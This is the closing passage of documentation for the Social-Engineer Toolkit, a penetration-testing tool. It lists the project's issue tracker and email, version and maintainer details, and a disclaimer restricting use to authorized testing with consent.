- **Issues**: https://github.com/trustedsec/social-engineer-toolkit/issues
- **Email**: info@trustedsec.com

---

## Version Information

- **Current Version**: See `src/core/set.version`
- **Last Updated**: 2025
- **Maintainer**: TrustedSec
- **Author**: David Kennedy (ReL1K)

---

## Disclaimer

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED. USE AT YOUR OWN RISK. THIS TOOL MUST ONLY BE USED FOR AUTHORIZED TESTING WHERE EXPLICIT CONSENT HAS BEEN GRANTED. ILLEGAL USE IS PROHIBITED.

---

*This documentation covers the public APIs and components of the Social-Engineer Toolkit. For internal development documentation, please refer to the source code comments and developer guides.*
